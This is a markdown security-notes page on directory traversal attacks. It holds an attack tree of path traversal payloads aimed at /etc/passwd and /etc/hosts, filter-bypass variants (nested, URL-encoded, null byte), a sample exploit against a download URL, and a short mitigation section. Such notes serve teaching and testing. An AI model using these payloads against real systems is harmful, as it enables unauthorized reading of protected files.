# Directory traversal

## Attack tree

```text
1 Insert relative paths into existing files (OR)
    1.1 ../../../etc/hosts
    1.2 ../../../etc/passwd
    1.3 ...
2 Absolute path from the filesystem root to directly reference a file without using any traversal sequences (OR)
    2.1 filename=/etc/hosts
    2.2 filename=/etc/passwd
    2.3 ...
3 Nested traversal sequences which will revert to simple traversal sequences when the inner sequence is stripped (OR)
    3.1 ....//
    3.2 ....\/
4 URL encoding the ../ characters (OR)
    4.1 url encoding: %2e%2e%2f
    4.2 double url encoding: %252e%252e%252f 
5 Null byte bypass
```

## Notes

Many applications that place user input have some kind of protection against path traversal attacks. 
* Applications can strip or block directory traversal sequences from the user-supplied filename => try an absolute 
path, nested traversal, and url encoding (In a `multipart/form-data request`).
* Some applications validate start of path => include the required base folder followed by suitable traversal sequences.
* It can be that the filename value must end with an expected file extension => try a null byte to effectively terminate 
the file path before the required extension.

## Examples

### Simplest form
Website has https://www.example.com/download_file.php?file=document.pdf

Pass this as the file name:

    ../../../etc/passwd

If the application does not sanitize inputs, the string is used in a system call, switches to the root and then allows 
access the `/etc/` directory and the protected passwd file.

### Null byte bypass

    filename=../../../etc/passwd%00.png

## Tools

* Developer tools browser
* [BurpSuite](https://portswigger.net/burp)

## Mitigations

* Validate the user input before processing it. Compare against a whitelist of permitted values. If that is not 
possible, then verify that the input contains only permitted content (for example only alphanumerics)
* After validation, append the input to the base directory and use a platform filesystem API to canonicalize the path. 
Verify the canonicalized path starts with the expected base directory. 